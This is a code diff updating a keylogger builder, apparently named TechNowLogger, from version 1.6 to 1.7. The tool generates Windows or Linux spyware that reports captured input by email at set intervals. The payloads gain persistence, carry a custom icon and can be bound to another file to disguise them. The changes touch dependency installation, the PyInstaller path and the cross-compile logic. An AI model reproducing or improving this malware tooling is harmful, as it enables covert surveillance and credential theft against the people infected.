@@ -1,4 +1,5 @@
 #!/usr/bin/python3
+import sys
 import encrypt_code
 import argparse
 import subprocess
@@ -11,12 +12,14 @@ import platform
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
 if platform.system() == 'Windows':
+    AttackerPlatform = 'Windows'
     WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")
 elif platform.system() == 'Linux':
+    AttackerPlatform = 'Linux'
     WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe")
 
 def get_arguments():
-    parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.6')
+    parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.7')
     parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
     parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds. default=120", default=120)
     parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10)    
@@ -41,7 +44,7 @@ def check_dependencies():
             import win32gui
         print(f"{GREEN}[+] All Dependencies are Installed on this system ;)\n")
     except Exception as e:
-        print(f"[!] Error : {e}")
+        print(f"{RED}[!] Error : {e}")
         try:
             print(f"{YELLOW}[*] Installing All Dependencies From Scratch...\n")
             print(f'\n{WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
@@ -53,20 +56,30 @@ def check_dependencies():
                 pip.main(['install', 'pynput==1.4.4'])
                 pip.main(['install', 'six==1.12.0']) 
                 pip.main(['install', 'python-xlib==0.25'])
-                if platform.system() == 'Windows':
-                    pip.main(['install', 'win32gui'])
+                pip.main(['install', 'pywin32'])
                 print(f'\n{WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
-                print(f"{GREEN}\n[+] Dependencies installed successfully ;)\n")
                 break
                 
         except AttributeError:
+            print(f"Error : {e}")
             print(f"{RED}\n[!] Unable to Install Dependencies, Please Try Again :(\n")        
-            print(f"{RED}\n[!] Try Running This command : python3 -m pip install --user --upgrade pip==9.0.3\n")
+            print(f"{RED}\n[!] Try Running This command : python -m pip install --user --upgrade pip==9.0.3\n")
             quit()
         
-        except:
-            print(f"{RED}\n[!] Unable to Install Dependencies, Please Try Again :(\n")
+        except Exception as e:
+            print(f"{RED}\n[!] Unable to Install Dependencies, Please Try Again :( error: {e}\n")
             quit()
+            
+        try:
+            import mss, essential_generators, PyInstaller, pynput, six, win32gui
+            if platform.system() == 'Windows':
+                import win32gui
+            print(f"{GREEN}\n[+] Dependencies installed successfully ;)\n")
+        except Exception as e:
+            print(f"{RED}[!] Unable To Install Dependencies | Error : {e}")
+            print(f"{YELLOW}[ X ] You Are Using Python {sys.version[:5]}")
+            print(f"{YELLOW}[ X ] Try to Install Python 3.7.4")
+            quit()        
 
 def create_keylogger(file_name, interval, email, password, time_persistent):
     with open(file_name, "w+") as file:
@@ -221,7 +234,14 @@ if __name__ == '__main__':
         if arguments.icon == None:
             arguments.icon = input(f'{RED}[!] Please Specify Icon Path {WHITE}[{GREEN}LEAVE BLANK to SET icon/exe.ico as icon{WHITE}] : ')
             if arguments.icon == "":
-                arguments.icon = "icon/exe.ico"        
+                arguments.icon = "icon/exe.ico"      
+
+        if not os.path.exists(WINDOWS_PYTHON_PYINSTALLER_PATH) and arguments.windows:
+            print(f"{RED}[!] Default Compiler Path Doesn't Exist {WHITE}")
+            print(f"\tDefault Pyinstaller Path In Windows: C:/Python37-32/Scripts/pyinstaller.exe")
+            print(f"\tDefault Pyinstaller Path In Linux: ~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe")
+            WINDOWS_PYTHON_PYINSTALLER_PATH = input(f"{YELLOW}[?] Please Enter pyinstaller.exe Path:{WHITE} ")
+            WINDOWS_PYTHON_PYINSTALLER_PATH = WINDOWS_PYTHON_PYINSTALLER_PATH.replace("\\", "/")
 
         print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]{GREEN}')
         print(f'\n   {YELLOW}Email:{RED} ' + arguments.email)
@@ -269,17 +289,24 @@ if __name__ == '__main__':
 
         print(f"{MAGENTA}")
 
-        if arguments.windows:
+        if AttackerPlatform == 'Windows':
             if arguments.bind == None or arguments.bind == "":
                 compile_for_windows(arguments.out, arguments.icon)
             else:
                 compile_for_windows_binded(arguments.out, arguments.icon)
+                
+        elif AttackerPlatform == 'Linux':
+            if arguments.windows:
+                if arguments.bind == None or arguments.bind == "":
+                    compile_for_windows(arguments.out, arguments.icon)
+                else:
+                    compile_for_windows_binded(arguments.out, arguments.icon)
 
-        elif arguments.linux:
-            compile_for_linux(arguments.out, arguments.icon)  
+            elif arguments.linux:
+                compile_for_linux(arguments.out, arguments.icon)  
 
-        else:
-            print(f"{RED}[!] Please Specify {YELLOW}-w{RED} for {GREEN}WINDOWS{RED} or {YELLOW}-l{RED} for {GREEN}LINUX{RED} payload generation")
+            else:
+                print(f"{RED}[!] Please Specify {YELLOW}-w{RED} for {GREEN}WINDOWS{RED} or {YELLOW}-l{RED} for {GREEN}LINUX{RED} payload generation")
 
         print(f"\n{YELLOW}[*] Deleting Junk Files...")
         del_junk_file(arguments.out)
